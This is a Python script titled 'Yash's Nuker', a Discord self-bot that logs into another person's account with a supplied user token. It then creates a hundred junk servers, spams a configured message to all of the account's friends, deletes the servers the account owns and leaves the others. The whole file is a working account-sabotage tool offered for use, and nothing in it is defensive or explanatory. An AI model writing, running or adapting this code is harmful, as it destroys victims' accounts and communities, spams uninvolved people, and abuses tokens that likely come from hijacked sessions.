import colorama
import ctypes
import os
import json
from colorama import Fore, Back
from discord.ext import commands
import random

from loading import Loader


if __name__ == '__main__':
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW("Yash's Nuker")
    colorama.init()


def show_text():
    text = """
██╗░░░██╗░█████╗░░██████╗██╗░░██╗██╗░██████╗  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
╚██╗░██╔╝██╔══██╗██╔════╝██║░░██║╚█║██╔════╝  ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
░╚████╔╝░███████║╚█████╗░███████║░╚╝╚█████╗░  ██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
░░╚██╔╝░░██╔══██║░╚═══██╗██╔══██║░░░░╚═══██╗  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
░░░██║░░░██║░░██║██████╔╝██║░░██║░░░██████╔╝  ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═════╝░  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝"""
    return text


print(Fore.LIGHTYELLOW_EX + Back.BLACK + show_text())
choices = " 1. Create Max Guilds \n 2. DM all users friends \n 3. Leave all guilds and delete owned ones \n 4. Unleash hell onto their accounts \n"
token = input(Fore.LIGHTYELLOW_EX + "Please give token of the account you would like to nuke!  \n")

loading = Loader(f"{Fore.LIGHTYELLOW_EX}┃{Fore.LIGHTGREEN_EX} Nuking account...", "Done!", 0.05)

with open('config.json') as f:
    data = json.load(f)

SPAM_MESSAGE = data['message']



class AccountNuker(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix=">>>")
        self.chars = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"

    async def spamguild(self):
        for x in range(100):
            name = (random.choice(self.chars) for x in range(10))
            await self.create_guild(name=f"{name}")
            print(Fore.RED + f"CREATED SERVER: {name}")

    async def spamdm(self):
        for user in self.user.friends:
            await user.send(f" {user.mention} {SPAM_MESSAGE}")
            print(Fore.RED + f"DMED {user}")

    async def tingycock(self):
        for guild in self.guilds:
            guildid = guild.owner
            if guildid is None:
                pass
            else:
                if self.user.id == guildid.id:
                    await guild.delete()
                    print(Fore.RED + f"DELETED {guild}")
                else:
                    to_leave = self.get_guild(guild.id)
                    await to_leave.leave()
                    print(Fore.RED + f"LEFT {guild}")

    async def on_ready(self):
        print(f"logged in as {self.user.name}")
        print(Fore.LIGHTYELLOW_EX + choices)
        stuff = input(Fore.LIGHTMAGENTA_EX + 'Please pick a choice \n')
        if stuff == '1':
            loading.start()
            await self.spamguild()
            loading.stop()
        elif stuff == '2':
            loading.start()
            await self.spamdm()
            loading.stop()
        elif stuff == '3':
            loading.start()
            await self.tingycock()
            loading.stop()
        elif stuff == '4':
            loading.start()
            await self.spamdm()
            await self.tingycock()
            await self.spamguild()
            loading.stop()

    async def on_error(self, event_method, *args, **kwargs):
        print(Fore.RED + "An Error has occurred. Please restart")


Nuker = AccountNuker()
try:
    Nuker.run(token, bot=False)
except:
    print(Fore.RED + "\n Token given is invalid")
